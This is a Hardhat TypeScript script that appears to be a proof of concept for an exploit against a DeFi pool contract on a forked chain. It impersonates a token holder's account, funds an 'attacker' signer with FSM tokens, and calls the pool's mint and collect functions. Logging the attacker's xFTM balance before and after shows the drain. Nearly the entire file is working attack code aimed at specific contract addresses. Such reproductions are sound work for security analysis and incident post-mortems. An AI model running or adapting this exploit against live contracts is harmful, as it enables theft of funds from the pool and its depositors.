import hre from "hardhat"
import {IERC20__factory, Pool__factory} from "../typechain";
import {formatUnits, parseUnits} from "ethers/lib/utils";
import {constants} from "ethers";

async function main() {
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: ["0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400"],
  });
  const signer = await hre.ethers.getSigner("0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400");
  const [attacker] = await hre.ethers.getSigners()
  const fsm = IERC20__factory.connect("0xaa621d2002b5a6275ef62d7a065a865167914801",attacker);
  const xFTM = IERC20__factory.connect("0xfbd2945d3601f21540ddd85c29c5c3caf108b96f",attacker);
  const pool = Pool__factory.connect("0x880672ab1d46d987e5d663fc7476cd8df3c9f937",attacker);

  console.log("Transfer 100 FSM to attacker.")
  await (await fsm.connect(signer).transfer(attacker.address, parseUnits("100", 18))).wait()
  console.log("xFTM balance of attacker : ",formatUnits(await xFTM.balanceOf(attacker.address),18));
  console.log("Exploiting...")
  await (await fsm.approve(pool.address, constants.MaxUint256)).wait()
  await (await pool.mint(parseUnits("100", 18), 1)).wait()
  await (await pool.collect()).wait()
  console.log("Exploit complete.")
  console.log("xFTM balance of attacker : ",formatUnits(await xFTM.balanceOf(attacker.address),18));


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
